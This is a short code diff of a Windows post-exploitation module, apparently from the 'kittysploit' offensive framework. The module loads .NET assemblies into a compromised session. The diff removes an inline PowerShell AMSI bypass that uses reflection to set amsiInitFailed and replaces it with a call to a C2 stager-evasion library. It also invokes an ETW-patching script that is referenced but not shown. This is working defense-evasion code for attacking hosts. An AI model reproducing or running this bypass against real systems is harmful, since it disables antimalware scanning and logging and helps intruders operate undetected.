@@ -5,17 +5,13 @@
 
 from kittysploit import *
 
+from lib.c2.stager_evasion import DEFAULT_AMSI_VARIANT, get_amsi_bypass
 from lib.post.windows.assembly_loader import (
     is_dotnet_pe,
     list_assemblies,
     resolve_assembly,
 )
 from lib.post.windows.session import WindowsSessionMixin
-
-_AMSI_INIT_FAILED = (
-    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
-    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
-)
 
 _ETW_PATCH_PS = r"""
 Add-Type @"
@@ -97,7 +93,7 @@ class Module(Post, WindowsSessionMixin):
         arguments = str(self.arguments or "").strip()
 
         if self.bypass_amsi:
-            self.win_run_powershell(_AMSI_INIT_FAILED, timeout=10)
+            self.win_run_powershell(get_amsi_bypass(DEFAULT_AMSI_VARIANT), timeout=10)
         if self.patch_etw:
             self.win_run_powershell(_ETW_PATCH_PS, timeout=15)
 
